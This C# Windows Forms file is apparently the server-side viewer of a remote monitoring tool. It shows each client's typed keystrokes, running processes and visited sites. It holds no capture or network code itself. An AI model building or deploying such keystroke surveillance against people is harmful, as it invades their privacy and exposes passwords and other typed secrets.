using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerSide
{
    public partial class CurrentState : Form
    {
        int id;
        string name;
        
        public CurrentState(int id, string name)
        {
            this.id = id;
            this.name = name;
            InitializeComponent();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            txbProcesses.Text = "";
            txbSites.Text = "";
            txbTyped.Text = "";
            stopCurrentState handler = Program.stopCurrentState;
            handler(id);
            txbProcesses.Text = "";            
            this.Close();
        }

        private void CurrentState_Load(object sender, EventArgs e)
        {
            this.Text= "Current State from client: " + Name + ", ID: " + id; 
        }
        
        public void addText(string str)
        {

            string[] add = str.Split(new[] { '\r', '\0' }, 2);
            if (add.Length >= 2) {
                string data = add[1].Split(new[] { '\0' }, 2)[0];
                Invoke((Action)delegate
                {
                    if (add[0] == "keyBoard")
                        txbTyped.AppendText(data + " ");
                    if (add[0] == "processes")
                        txbProcesses.Text = data;                      
                    if (add[0] == "site")
                    {
                        txbSites.AppendText(data + "\r\n");
                        txbSites.AppendText("\r\n");
                    }
                       
                });
            }
           
            
        }

        
    }
}
 